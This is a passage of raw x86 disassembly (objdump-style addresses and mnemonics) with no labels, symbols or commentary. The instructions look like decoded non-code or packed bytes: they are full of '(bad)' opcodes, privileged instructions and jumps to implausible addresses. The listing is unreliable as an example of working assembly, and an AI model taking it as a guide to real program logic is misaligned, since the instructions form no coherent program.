  406604:	or     ecx,0x77
  406607:	pop    ecx
  406608:	dec    edx
  406609:	daa    
  40660a:	or     BYTE PTR [ecx],bh
  40660c:	push   esp
  40660d:	push   ebp
  40660e:	xchg   DWORD PTR [edi-0x452debc7],eax
  406614:	mov    ecx,0xbdf9b91e
  406619:	je     0x4065b6
  40661b:	data16 outs dx,BYTE PTR ds:[esi]
  40661d:	push   cs
  40661e:	sub    DWORD PTR [ebx-0x21],ebp
  406621:	xchg   ecx,eax
  406622:	out    dx,al
  406623:	int    0x95
  406625:	ror    DWORD PTR [esi],cl
  406627:	outs   dx,BYTE PTR ds:[esi]
  406628:	shr    DWORD PTR [edx+0x7f937290],1
  40662e:	xchg   esi,eax
  40662f:	cvtps2pd xmm5,QWORD PTR [edi-0x47]
  406633:	dec    eax
  406634:	mov    WORD PTR [edi],fs
  406636:	mov    al,ds:0x698e8da8
  40663b:	cmp    ebp,DWORD PTR [ebx]
  40663d:	std    
  40663e:	fdivr  DWORD PTR [esi-0x683150a8]
  406644:	sti    
  406645:	mov    cl,0xad
  406647:	add    DWORD PTR [eax-0x1a5f3cf7],0x5c
  40664e:	loopne 0x40669b
  406650:	inc    edx
  406651:	or     BYTE PTR [ebp-0x6d],ch
  406654:	aam    0x55
  406656:	xor    ebx,0xffffffb0
  406659:	mov    WORD PTR ds:0x2def4303,es
  40665f:	fadd   DWORD PTR [ecx]
  406661:	push   ds
  406662:	mov    esi,0x60734ec1
  406667:	leave  
  406668:	sar    DWORD PTR [ecx+ebx*8+0x47a9692e],0x90
  406670:	dec    eax
  406671:	sub    BYTE PTR [esi+0x79],cl
  406674:	out    dx,eax
  406675:	adc    BYTE PTR ds:0xf08b9b1d,cl
  40667b:	cmc    
  40667c:	sbb    eax,ebx
  40667e:	cmp    bh,BYTE PTR [edi+0x2e]
  406681:	xchg   ebx,eax
  406682:	mov    dl,0x78
  406684:	xchg   BYTE PTR [eax+0xe],bl
  406687:	and    BYTE PTR [edx+0x26dae4fd],bl
  40668d:	add    cl,BYTE PTR [ecx]
  40668f:	sbb    bh,bl
  406691:	aas    
  406692:	seto   BYTE PTR [esi+0x20]
  406696:	call   0x61fffb68
  40669b:	mov    bl,0x6b
  40669d:	add    DWORD PTR [ecx],esi
  40669f:	jae    0x4066bd
  4066a1:	outs   dx,BYTE PTR ds:[esi]
  4066a2:	pushf  
  4066a3:	(bad)  
  4066a4:	xchg   esi,eax
  4066a5:	lock adc dl,BYTE PTR [edi+eiz*8-0x6a]
  4066aa:	inc    eax
  4066ab:	test   BYTE PTR [ebx+0x1a157cae],ch
  4066b1:	ret    0xe3b4
  4066b4:	push   ebx
  4066b5:	xchg   esi,eax
  4066b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066b7:	ret    0x967e
  4066ba:	aas    
  4066bb:	loop   0x4066ee
  4066bd:	fcomip st,st(3)
  4066bf:	or     BYTE PTR [edi-0x60feabcb],ch
  4066c5:	jo     0x406732
  4066c7:	out    0x66,al
  4066c9:	and    al,0xa1
  4066cb:	mov    esp,0x8f208253
  4066d0:	add    dh,bh
  4066d2:	jle    0x1dc54d44
  4066d8:	iret   
  4066d9:	fldcw  WORD PTR [edi+ebp*4-0x38e18ff0]
  4066e0:	icebp  
  4066e1:	jb     0x4066fa
  4066e3:	dec    ecx
  4066e4:	xor    BYTE PTR [esp+edi*1+0x31],ah
  4066e8:	icebp  
  4066e9:	sahf   
  4066ea:	or     ch,BYTE PTR [edi-0x78e34095]
  4066f0:	pop    edx
  4066f1:	mov    ds:0x8a64f028,al
  4066f6:	das    
  4066f7:	sahf   
  4066f8:	sub    eax,esp
  4066fa:	and    edi,esp
  4066fc:	pop    ebp
  4066fd:	ret    
  4066fe:	mov    ds:0x56aafd03,al
  406703:	out    dx,eax
  406704:	pop    ds
  406705:	push   es
  406706:	ror    BYTE PTR [edx+edi*2-0x4ad9c0dc],1
  40670d:	or     BYTE PTR [ecx-0x25],dl
  406710:	sbb    DWORD PTR [esi],esi
  406712:	xchg   esi,eax
  406713:	adc    DWORD PTR [esi+0x52],edi
  406716:	cmp    BYTE PTR ds:0xe83cd25e,al
  40671c:	in     eax,dx
  40671d:	into   
  40671e:	jnp    0x406757
  406720:	or     al,0xe4
  406722:	rol    DWORD PTR [eax+0x1bd7bf17],1
  406728:	pop    ebp
  406729:	ins    BYTE PTR es:[edi],dx
  40672a:	scas   al,BYTE PTR es:[edi]
  40672b:	cvtpi2ps xmm1,mm0
  40672e:	rcr    DWORD PTR [esp+ecx*1-0xa],cl
  406732:	js     0x406782
  406734:	lahf   
  406735:	aad    0xad
  406737:	ror    ebx,1
  406739:	pop    eax
  40673a:	retf   0xd316
  40673d:	div    esp
  40673f:	push   esp
  406740:	or     BYTE PTR [ebx+0x0],0x6a
  406744:	jo     0x4066ec
  406746:	push   cs
  406747:	test   BYTE PTR [ebx+ecx*4],bl
  40674a:	dec    edi
  40674b:	test   BYTE PTR [edx+ecx*1+0x1e],dl
  40674f:	div    DWORD PTR [ebx]
  406751:	iret   
  406752:	icebp  
  406753:	(bad)  [eax+0x48a3ff40]
  406759:	inc    ebp
  40675a:	mov    dl,0x3a
  40675c:	pop    eax
  40675d:	inc    ebp
  40675e:	xor    eax,0xe932d40d
  406763:	jp     0x406745
  406765:	mov    ecx,0xdc70ff09
  40676a:	mov    al,0x67
  40676c:	fcmove st,st(3)
  40676e:	adc    eax,0xe46ad88
  406773:	icebp  
  406774:	adc    cl,BYTE PTR [eax+0x59029d71]
  40677a:	push   eax
  40677b:	shr    DWORD PTR [ebx],1
  40677d:	aam    0xa5
  40677f:	and    al,0x64
  406781:	cmpxchg dl,dl
  406784:	jb     0x40678c
  406786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406787:	adc    al,0xa9
  406789:	jecxz  0x406769
  40678b:	jp     0x4067b7
  40678d:	mov    esp,DWORD PTR [esi+0x3b]
  406790:	test   BYTE PTR [ecx+0x76b0d373],al
  406796:	cmp    eax,0xa60eee89
  40679b:	mov    cl,0xf4
  40679d:	jno    0x40680a
  40679f:	xor    BYTE PTR [ebx-0x78],ch
  4067a2:	or     edx,DWORD PTR [ebx*2+0x2459205d]
  4067a9:	add    eax,0xed8d2d85
  4067ae:	push   edi
  4067af:	inc    ebx
  4067b0:	mov    ds:0xe303916a,eax
  4067b5:	scas   al,BYTE PTR es:[edi]
  4067b6:	out    dx,eax
  4067b7:	lods   eax,DWORD PTR ds:[esi]
  4067b8:	dec    esi
  4067b9:	cmp    DWORD PTR [esi-0x20],0xfffffff2
  4067bd:	add    dh,BYTE PTR [edi+0x54ac2419]
  4067c3:	cmp    al,0x97
  4067c5:	mov    al,ds:0x145aa1ec
  4067ca:	(bad)  
  4067cb:	pop    ds
  4067cc:	mov    ecx,0x40181fd
  4067d1:	push   DWORD PTR [ebx]
  4067d3:	(bad)  
  4067d4:	mov    edi,0x45a837f9
  4067d9:	(bad)  
  4067da:	hlt    
  4067db:	retf   0xc856
  4067de:	inc    BYTE PTR [ecx-0x7777f2dc]
  4067e4:	jae    0x4067ee
  4067e6:	mov    bl,0xb
  4067e8:	test   al,0x8c
  4067ea:	inc    edx
  4067eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ec:	dec    edi
  4067ed:	adc    ch,dl
  4067ef:	add    BYTE PTR [ecx+0x2a7f1fc9],dh
  4067f5:	pop    es
  4067f6:	xchg   ecx,eax
  4067f7:	shl    DWORD PTR [eax-0x8],0x24
  4067fb:	inc    edi
  4067fc:	jg     0x4067a7
  4067fe:	(bad)  
  4067ff:	repnz mul BYTE PTR [ebp-0x7b]
  406803:	pushf  
  406804:	in     eax,0xc0
  406806:	jmp    0xc1de1102
  40680b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40680c:	push   ecx
  40680d:	mov    edi,0x495cb716
  406812:	push   edi
  406813:	xchg   esi,eax
  406814:	push   es
  406815:	cvtps2pd xmm6,QWORD PTR ds:0xa997835b
  40681c:	(bad)  
  40681d:	in     al,dx
  40681e:	sub    eax,0xa3e54596
  406823:	out    0x54,eax
  406825:	push   esp
  406826:	out    0x72,al
  406828:	stos   DWORD PTR es:[edi],eax
  406829:	mov    cl,0xd6
  40682b:	ja     0x4067c0
  40682d:	or     ch,cl
  40682f:	sub    bh,BYTE PTR [edi-0x41aa3f8]
  406835:	add    ecx,DWORD PTR [esi+0x23]
  406838:	bndstx [esi],bnd3
  40683b:	mov    eax,ds:0xe40b677b
  406840:	pop    eax
  406841:	(bad)  
  406842:	jo     0x406868
  406844:	fisub  WORD PTR [ebp+0x1a7fb1b1]
  40684a:	ins    BYTE PTR es:[edi],dx
  40684b:	cmp    eax,0xce2e27ad
  406850:	sbb    edi,edx
  406852:	pop    esi
  406853:	xor    dl,0x3b
  406856:	shl    BYTE PTR [ecx+edi*4-0x36],cl
  40685a:	cli    
  40685b:	int    0x16
  40685d:	inc    DWORD PTR [ebx-0x5b]
  406860:	xchg   BYTE PTR ds:0x6f88f06f,bl
  406866:	mov    edi,0xd0495b9e
  40686b:	sbb    BYTE PTR [ecx],0x7a
  40686e:	or     ch,BYTE PTR [esi]
  406870:	mov    bl,0xff
  406872:	fucomi st,st(3)
  406874:	icebp  
  406875:	mov    ds:0x61141c67,al
  40687a:	aaa    
  40687b:	or     DWORD PTR [eax+eiz*4-0x6f],ecx
  40687f:	xor    BYTE PTR ds:0xde1714e2,bl
  406885:	add    eax,0x4afef86e
  40688a:	idiv   edx
  40688c:	jns    0x4068c9
  40688e:	pop    ss
  40688f:	jecxz  0x406837
  406891:	pop    esp
  406892:	rol    esi,cl
  406894:	daa    
  406895:	mov    ah,0x37
  406897:	adc    BYTE PTR [ecx],ah
  406899:	shl    BYTE PTR [esi],cl
  40689b:	fcmovnbe st,st(1)
  40689d:	sub    eax,0x98d2ce20
  4068a2:	and    al,0x58
  4068a4:	push   ss
  4068a5:	outs   dx,BYTE PTR ds:[esi]
  4068a6:	pop    ebp
  4068a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a8:	ficomp WORD PTR [edx+0x774426b6]
  4068ae:	mov    edx,DWORD PTR [esi+ebx*4-0x55]
  4068b2:	jecxz  0x406852
  4068b4:	(bad)  
  4068b5:	leave  
  4068b6:	inc    eax
  4068b7:	xor    BYTE PTR [edi-0xe],0xdd
  4068bb:	mov    eax,ds:0x64545c3
  4068c0:	mov    eax,ds:0x2823b0d8
  4068c5:	mov    eax,0x29859cc2
  4068ca:	hlt    
  4068cb:	cmp    al,0xe
  4068cd:	sahf   
  4068ce:	jns    0x406935
  4068d0:	setb   BYTE PTR [esi]
  4068d3:	popa   
  4068d4:	cld    
  4068d5:	(bad)  
  4068d6:	push   ebx
  4068d7:	ret    0x63e
  4068da:	int3   
  4068db:	add    ecx,DWORD PTR [eax+0x6741fee8]
  4068e1:	sahf   
  4068e2:	(bad)  
  4068e3:	in     al,0x72
  4068e5:	das    
  4068e6:	cwde   
  4068e7:	bound  ecx,QWORD PTR cs:[eax+0x48]
  4068eb:	or     eax,0x2a4578ed
  4068f0:	rcr    DWORD PTR [ecx+0x4eb82ef0],cl
  4068f6:	pop    ss
  4068f7:	loope  0x406889
  4068f9:	adc    dl,dh
  4068fb:	jns    0x4068c5
  4068fd:	scas   eax,DWORD PTR es:[edi]
  4068fe:	jae    0x406950
  406900:	rol    DWORD PTR [edx-0xa],0xde
  406904:	daa    
  406905:	and    eax,0xd9d22cf9
  40690a:	das    
  40690b:	push   es
  40690c:	pop    edi
  40690d:	nop
  40690e:	loop   0x406987
  406910:	test   eax,0xc107b902
  406915:	int    0xab
  406917:	mov    cl,0xfd
  406919:	xor    dl,0x82
  40691c:	or     DWORD PTR [ebp-0x27],edx
  40691f:	push   ds
  406920:	sub    cl,BYTE PTR [esi-0x5a0f6de3]
  406926:	mov    bh,0xec
  406928:	sbb    esi,ecx
  40692a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40692b:	pop    ebx
  40692c:	retf   0x73b4
  40692f:	jne    0x40698d
  406931:	dec    esp
  406932:	repz jge 0x40694c
  406935:	inc    edx
  406936:	es xchg ebp,eax
  406938:	mov    edx,0x37350101
  40693d:	test   eax,0x3b20424
  406942:	leave  
  406943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406944:	pop    ecx
  406945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406946:	adc    DWORD PTR [edi-0x47077fec],edi
  40694c:	jbe    0x4068d5
  40694e:	pop    edx
  40694f:	pop    cx
  406951:	sbb    BYTE PTR [eax+0x5d],ah
  406954:	hlt    
  406955:	lahf   
  406956:	and    BYTE PTR [ebx-0x5cd8e26b],dl
  40695c:	sti    
  40695d:	bound  edi,QWORD PTR [ebx+0x3f]
  406960:	icebp  
  406961:	pop    esp
  406962:	mov    eax,ds:0xe39c4231
  406967:	dec    edx
  406968:	and    BYTE PTR ds:0xe2be0983,0xc3
  40696f:	xchg   esp,eax
  406970:	sub    esp,DWORD PTR [ebp-0x10]
  406973:	xchg   DWORD PTR [ecx],esp
  406975:	retf   
  406976:	mov    dl,0xc9
  406978:	push   edx
  406979:	les    edx,FWORD PTR [ebx]
  40697b:	retf   
  40697c:	cmc    
  40697d:	dec    edi
  40697e:	loop   0x406947
  406980:	sbb    ecx,edi
  406982:	popf   
  406983:	(bad)  
  406985:	or     ah,BYTE PTR [ecx+esi*2+0x39]
  406989:	lods   al,BYTE PTR ds:[esi]
  40698a:	mov    ebx,0x850f0826
  40698f:	mov    al,0xa8
  406991:	and    edi,DWORD PTR [eax+ebx*2]
  406994:	and    eax,0x7553a969
  406999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40699a:	push   ds
  40699b:	inc    esp
  40699c:	adc    eax,0xffb24ba
  4069a1:	ror    BYTE PTR [ebp+ecx*2-0x40],1
  4069a5:	xor    al,0xdc
  4069a7:	xor    ebx,edx
  4069a9:	sub    al,0xb7
  4069ab:	fs mov bl,0xb5
  4069ae:	and    bl,bh
  4069b0:	xchg   ebx,eax
  4069b1:	jno    0x4069a0
  4069b3:	mov    al,ds:0x35b088dc
  4069b8:	push   0xffffffa6
  4069ba:	pop    es
  4069bb:	jle    0x4069a2
  4069bd:	xor    al,0x52
  4069bf:	inc    eax
  4069c0:	mov    DWORD PTR [eax+0x10],ebp
  4069c3:	jmp    0x6d10f9c9
  4069c8:	aas    
  4069c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ca:	or     bl,BYTE PTR [edx+edi*2-0x36]
  4069ce:	mov    dl,0xdd
  4069d0:	gs add al,0xae
  4069d3:	cmp    al,0xe8
  4069d5:	cmp    BYTE PTR [esi+0x206aea64],bl
  4069db:	add    bh,BYTE PTR [edx]
  4069dd:	lock push ebp
  4069df:	(bad)  
  4069e0:	sub    edx,eax
  4069e2:	aad    0x1c
  4069e4:	dec    esi
  4069e5:	into   
  4069e6:	or     dh,bh
  4069e8:	adc    DWORD PTR [ecx-0x25],eax
  4069eb:	cmp    BYTE PTR [ecx+0x46],ah
  4069ee:	test   DWORD PTR [ecx+0x29],esp
  4069f1:	lock ins DWORD PTR es:[edi],dx
  4069f3:	push   ebp
  4069f4:	mov    al,ds:0xcbb5ae15
  4069f9:	stos   DWORD PTR es:[edi],eax
  4069fa:	cwde   
  4069fb:	icebp  
  4069fc:	push   ecx
  4069fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069fe:	je     0x4069f6
  406a00:	adc    ecx,DWORD PTR [ebx+0x38]
  406a03:	(bad)
  406a08:	mov    ebp,0xd954b4a3
  406a0d:	imul   ebp,edx,0xffffff97
  406a10:	inc    ecx
  406a11:	repnz nop
  406a13:	or     esp,ecx
  406a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a16:	push   0x43107ca0
  406a1b:	sbb    ebp,DWORD PTR fs:[ebx]
  406a1e:	cmp    BYTE PTR [esi+0x51],bl
  406a21:	sbb    bh,BYTE PTR [esi+0x6b934ba6]
  406a27:	inc    edx
  406a28:	push   ecx
  406a29:	pop    ss
  406a2a:	sub    cl,ah
  406a2c:	dec    ebx
  406a2d:	les    esp,FWORD PTR [eax]
  406a2f:	xlat   BYTE PTR ds:[ebx]
  406a30:	adc    bh,dh
  406a32:	sbb    DWORD PTR [ecx],esi
  406a34:	jae    0x4069b6
  406a36:	ja     0x4069be
  406a38:	sbb    al,dh
  406a3a:	shl    BYTE PTR [ecx],cl
  406a3c:	jp     0x406a97
  406a3e:	ret    0xd80e
  406a41:	ret    0x63af
  406a44:	mov    cs,ebp
  406a46:	shr    BYTE PTR [esi-0x57],0x68
  406a4a:	jb     0x406aaf
  406a4c:	mov    esi,0xa4be05ff
  406a51:	outs   dx,BYTE PTR ds:[esi]
  406a52:	xchg   esp,eax
  406a53:	mov    ch,0xa
  406a55:	dec    eax
  406a56:	jb     0x406acd
  406a58:	xlat   BYTE PTR ds:[ebx]
  406a59:	dec    esi
  406a5a:	mul    BYTE PTR [esi+0x1659cf4a]
  406a60:	mov    ah,0x19
  406a62:	or     cl,BYTE PTR [esi-0x52]
  406a65:	call   0x69ed417d
  406a6a:	push   ecx
  406a6b:	pusha  
  406a6c:	cmc    
  406a6d:	jne    0x406ac6
  406a6f:	cs popf 
  406a71:	clc    
  406a72:	outs   dx,BYTE PTR ds:[esi]
  406a73:	dec    ebp
  406a74:	lods   eax,DWORD PTR ds:[esi]
  406a75:	push   ss
  406a76:	add    al,ah
  406a78:	lahf   
  406a79:	xchg   edi,eax
  406a7a:	mov    cl,0x18
  406a7c:	push   eax
  406a7d:	xor    esi,ebp
  406a7f:	shl    ah,1
  406a81:	retf   0x5d63
  406a84:	push   ss
  406a85:	out    dx,al
  406a86:	out    dx,eax
  406a87:	adc    bl,0xd
  406a8a:	mov    ah,BYTE PTR [edx]
  406a8c:	(bad)  
  406a8d:	inc    ebp
  406a8e:	cmp    BYTE PTR ds:0x549c7293,al
  406a94:	jecxz  0x406a40
  406a96:	push   edi
  406a97:	sbb    al,0xad
  406a99:	push   esi
  406a9a:	adc    ch,cl
  406a9c:	iret   
  406a9d:	pop    ebp
  406a9e:	sub    edi,DWORD PTR [ebp-0x65]
  406aa1:	jmp    0x406ac3
  406aa3:	jp     0x406a81
  406aa5:	cmp    BYTE PTR [ebx+0x7d],dh
  406aa8:	or     ecx,DWORD PTR cs:[bx+0x465d]
  406aae:	pusha  
  406aaf:	xor    al,0x33
  406ab1:	mov    esp,0x469ed6c2
  406ab6:	ds div WORD PTR ss:[ebp-0xae79a67]
  406abf:	pop    ecx
  406ac0:	jle    0x406a93
  406ac2:	shl    DWORD PTR es:[edi-0x2a],0x39
  406ac7:	stos   BYTE PTR es:[edi],al
  406ac8:	pop    esi
  406ac9:	or     al,0x9e
  406acb:	les    esi,FWORD PTR [esi+0x76991d4c]
  406ad1:	cmp    DWORD PTR [edx],0xa499a527
  406ad7:	scas   al,BYTE PTR es:[edi]
  406ad8:	outs   dx,DWORD PTR ds:[esi]
  406ad9:	sub    al,ch
  406adb:	lods   al,BYTE PTR ds:[esi]
  406adc:	adc    esi,DWORD PTR [edi]
  406ade:	pushf  
  406adf:	retf   0xd78b
  406ae2:	sbb    BYTE PTR [ebx-0xcdae02f],cl
  406ae8:	out    0x4,al
  406aea:	arpl   WORD PTR [edi+ebx*4+0x21],sp
  406aee:	xchg   ecx,eax
  406aef:	push   0xffffff92
  406af1:	aam    0xff
  406af3:	retf   
  406af4:	mov    ds:0xe1248a3,eax
  406af9:	adc    esi,DWORD PTR [edi+0x3d1b9e79]
  406aff:	sbb    BYTE PTR [edx-0x42d72d85],bh
  406b05:	aad    0x8c
  406b07:	adc    eax,0x1783f967
  406b0c:	inc    edi
  406b0d:	mov    ds:0xb7c906b8,eax
  406b12:	ss ret 
  406b14:	xchg   esi,eax
  406b15:	and    eax,0x1808c524
  406b1a:	and    bl,dl
  406b1c:	scas   eax,DWORD PTR es:[edi]
  406b1d:	scas   eax,DWORD PTR es:[edi]
  406b1e:	iret   
  406b1f:	fisttp QWORD PTR [ebx]
  406b21:	pop    edi
  406b22:	xor    DWORD PTR [edx-0x531a87c2],0x5a871e92
  406b2c:	repz jge 0x406b55
  406b2f:	mov    ebp,0x9acc63bc
  406b34:	inc    DWORD PTR [ebp+0x7a]
  406b37:	jno    0x406baa
  406b39:	fnsave [eax]
  406b3b:	fwait
  406b3c:	xchg   esp,eax
  406b3d:	jae    0x406ad8
  406b3f:	push   edx
  406b40:	lock imul ebp,DWORD PTR [ecx+esi*4],0xc0b101ae
  406b48:	inc    edx
  406b49:	pop    ebp
  406b4b:	cmp    BYTE PTR [eax-0x2d2c931b],bh
  406b51:	inc    esp
  406b52:	push   edi
  406b53:	clc    
  406b54:	pop    es
  406b55:	mov    edi,0xba0d027e
  406b5a:	imul   edi,ebp,0xffffffb2
  406b5d:	add    DWORD PTR [ecx],0x61
  406b60:	fadd   QWORD PTR [esi-0x3135b440]
  406b66:	call   0xf150f254
  406b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b6c:	xchg   BYTE PTR [ecx+0x17],dh
  406b6f:	lahf   
  406b70:	xchg   ebx,eax
  406b71:	(bad)  
  406b72:	int    0x39
  406b74:	(bad)
  406b78:	xor    al,0x16
  406b7a:	push   eax
  406b7b:	xor    BYTE PTR [edi],dh
  406b7d:	pusha  
  406b7e:	nop
  406b7f:	das    
  406b80:	aaa    
  406b81:	repz mov ch,BYTE PTR ds:0x11d49e94
  406b88:	ror    DWORD PTR [ebx],cl
  406b8a:	call   DWORD PTR [eax]
  406b8c:	sbb    ebx,DWORD PTR [esi+0x703a4f08]
  406b92:	mov    ah,0xf7
  406b94:	les    ebx,FWORD PTR [esi+0x62e0c1d2]
  406b9a:	arpl   WORD PTR [esi],ax
  406b9c:	dec    esi
  406b9d:	inc    edi
  406b9e:	mov    esp,0xbf981f2d
  406ba3:	retf   0x44b3
  406ba6:	xchg   esp,eax
  406ba7:	outs   dx,DWORD PTR ds:[esi]
  406ba8:	(bad)  
  406ba9:	nop
  406baa:	sbb    ch,BYTE PTR [eax-0x46]
  406bad:	leave  
  406bae:	test   BYTE PTR [edi],ah
  406bb0:	jns    0x406bd3
  406bb2:	sub    DWORD PTR [edi+0x51b6fe0b],edi
  406bb8:	cmp    BYTE PTR [esi+0x361d2113],0x2e
  406bbf:	(bad)  
  406bc0:	pop    ecx
  406bc1:	leave  
  406bc2:	mov    edx,edx
  406bc4:	scas   al,BYTE PTR es:[edi]
  406bc5:	jmp    0x37b0:0x1fd149
  406bcc:	std    
  406bcd:	imul   ebx,DWORD PTR [ebp-0x70],0xffffffbc
  406bd1:	gs call 0xee5cfdc7
  406bd7:	and    DWORD PTR fs:[ebx+esi*4+0x2a],esp
  406bdc:	imul   DWORD PTR [esi-0x3f]
  406bdf:	icebp  
  406be0:	xor    DWORD PTR [ebx+0x77f9b4f6],esp
  406be6:	in     al,0x8f
  406be8:	aaa    
  406be9:	and    DWORD PTR [eax+ebp*4+0x3af74045],0x4633fdda
  406bf4:	adc    BYTE PTR [edx+0x6b],ch
  406bf7:	imul   ecx,DWORD PTR [edi+0x5747c5c1],0x9aeb1d90
  406c01:	and    al,0x36
  406c03:	dec    esp
  406c04:	out    0x7e,eax
  406c06:	mov    ds:0x15af2ff4,eax
  406c0b:	das    
  406c0c:	xchg   ecx,eax
  406c0d:	ds dec esi
  406c10:	dec    ecx
  406c11:	pop    ebx
  406c12:	test   al,0xf4
  406c14:	sahf   
  406c15:	sbb    al,BYTE PTR [ecx-0x35079860]
  406c1b:	pop    ebp
  406c1c:	xor    bl,dl
  406c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c1f:	jbe    0x406bba
  406c21:	(bad)  
  406c22:	cmp    eax,0xd0045fbe
  406c27:	fldcw  WORD PTR [ecx-0x662b562c]
  406c2d:	(bad)  
  406c2e:	jecxz  0x406c2a
  406c30:	inc    edx
  406c31:	aas    
  406c32:	sar    BYTE PTR [ebx+0x6],1
  406c35:	dec    ebp
  406c36:	jo     0x406c6d
  406c38:	adc    cl,dh
  406c3a:	iret   
  406c3b:	sub    bh,BYTE PTR [esi]
  406c3d:	push   ebx
  406c3e:	dec    eax
  406c3f:	sub    esi,DWORD PTR [esi+0x2a]
  406c42:	fadd   DWORD PTR [ebx]
  406c44:	es int 0x4d
  406c47:	sub    al,0x15
  406c49:	or     bl,ch
  406c4b:	adc    eax,0xe9e66883
  406c50:	xchg   ebx,eax
  406c51:	cmp    eax,0xcded8cc7
  406c56:	out    dx,al
  406c57:	fcomp  QWORD PTR [eax]
  406c59:	je     0x406cbf
  406c5b:	push   0xf9233a2
  406c60:	or     esi,DWORD PTR [edx]
  406c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c64:	int    0x14
  406c66:	ret    0xd9d8
  406c69:	aaa    
  406c6a:	lock jo 0x406c99
  406c6d:	xchg   ecx,eax
  406c6e:	add    bh,ch
  406c70:	div    DWORD PTR [edi]
  406c72:	test   al,0x9f
  406c74:	xadd   BYTE PTR [ecx+0x50],ch
  406c78:	xchg   DWORD PTR [edi+0x2],ebx
  406c7b:	sub    BYTE PTR [ebp+0x3d],bh
  406c7e:	iret   
  406c7f:	dec    ebx
  406c80:	call   0xdbf782f
  406c85:	cli    
  406c86:	xchg   esi,eax
  406c87:	xlat   BYTE PTR ds:[ebx]
  406c88:	fdivr  st,st(0)
  406c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c8b:	jbe    0x406c72
  406c8d:	sbb    BYTE PTR [ebp+eax*8-0x53],cl
  406c91:	sti    
  406c92:	fcomp  QWORD PTR ds:0xb6585096
  406c98:	pop    ebx
  406c99:	pop    esi
  406c9a:	jns    0x406c2a
  406c9c:	lods   al,BYTE PTR ds:[esi]
  406c9d:	sub    ebx,ebx
  406c9f:	adc    DWORD PTR [ebp+0x20],ecx
  406ca2:	lods   al,BYTE PTR ds:[esi]
  406ca3:	dec    esp
  406ca4:	inc    edi
  406ca5:	or     al,0x8c
  406ca7:	pop    es
  406ca8:	dec    esp
  406ca9:	xor    eax,ebp
  406cab:	stos   BYTE PTR es:[edi],al
  406cac:	lea    esi,[esi]
  406cae:	dec    esi
  406caf:	inc    ecx
  406cb0:	jmp    0x8880e8ea
  406cb5:	into   
  406cb6:	xor    al,0x9c
  406cb8:	push   ebx
  406cb9:	std    
  406cba:	jbe    0x406cef
  406cbc:	lock jge 0x406d2f
  406cbf:	mov    ebx,0xca17a1a1
  406cc4:	adc    DWORD PTR [esi-0x462d344e],0xb24c1dcf
  406cce:	mov    DWORD PTR [esi+ebp*1-0x3b2ae11f],ebp
  406cd5:	adc    DWORD PTR [ebx+0x31],ebx
  406cd8:	push   ecx
  406cd9:	mov    ebx,0xc5129df5
  406cde:	mov    ch,0x9a
  406ce0:	sbb    DWORD PTR [ecx-0x353d5ed],eax
  406ce6:	mov    ebp,0x9e3fa75d
  406ceb:	or     eax,0xfb3643b9
  406cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf1:	std    
  406cf2:	dec    edi
  406cf3:	scas   eax,DWORD PTR es:[edi]
  406cf4:	or     eax,0x7481a975
  406cf9:	lock push ecx
  406cfb:	(bad)  
  406cfc:	xor    eax,0x7a5db4bc
  406d01:	rol    bl,cl
  406d03:	push   esi
  406d04:	xor    DWORD PTR [edx],0xfd144d0a
  406d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d0b:	xchg   edi,eax
  406d0c:	push   esi
  406d0d:	push   ds
  406d0e:	fisttp QWORD PTR [ecx+0x13d42d7a]
  406d14:	xchg   BYTE PTR [eax+eiz*1+0x781d3d71],dh
  406d1b:	mov    eax,0x96e19c55
  406d20:	adc    DWORD PTR [eax-0x2b],ecx
  406d23:	lods   al,BYTE PTR ds:[esi]
  406d24:	dec    edi
  406d25:	push   edi
  406d26:	mov    dl,0x74
  406d28:	push   ebp
  406d29:	mov    BYTE PTR [eax],0x4
  406d2c:	and    BYTE PTR [edi+0x1b],ah
  406d2f:	and    al,0x34
  406d31:	pop    DWORD PTR [esi]
  406d33:	lock aam 0x96
  406d36:	call   0xa015:0xecfab69a
  406d3d:	test   dh,0x8d
  406d40:	jbe    0x406d2f
  406d42:	out    0x66,eax
  406d44:	jmp    0x74648f11
  406d49:	mov    ebx,0x937bcd0e
  406d4e:	enter  0x2a4e,0xa2
  406d52:	or     ah,BYTE PTR [esi+0x58]
  406d55:	fisttp QWORD PTR [ebx+0x40]
  406d58:	push   0x67
  406d5a:	pop    esi
  406d5b:	mov    al,0x13
  406d5d:	retf   
  406d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5f:	shl    DWORD PTR [edx],0xcd
  406d62:	mov    ds:0x8ba694e0,eax
  406d67:	adc    DWORD PTR [ebp+0x31a94b60],edi
  406d6d:	gs idiv esp
  406d70:	cmp    ch,BYTE PTR [ecx+0x5518108]
  406d76:	xchg   edi,eax
  406d77:	sbb    DWORD PTR [edx*1-0x7c2387c7],ebp
  406d7e:	dec    edx
  406d7f:	dec    ebp
  406d80:	jne    0x406d99
  406d82:	out    dx,eax
  406d83:	mov    edi,0xd0c39050
  406d88:	jae    0x406d6c
  406d8a:	fmul   DWORD PTR [eax-0xc]
  406d8d:	aaa    
  406d8e:	sub    eax,0xe9a35a13
  406d93:	jge    0x406d99
  406d95:	inc    esp
  406d96:	sbb    eax,0xe08ea1f6
  406d9b:	push   0xffffffe6
  406d9d:	cmp    eax,0x5bd5601b
  406da2:	jmp    0x2b02e10
  406da7:	mov    dl,0x1d
  406da9:	fwait
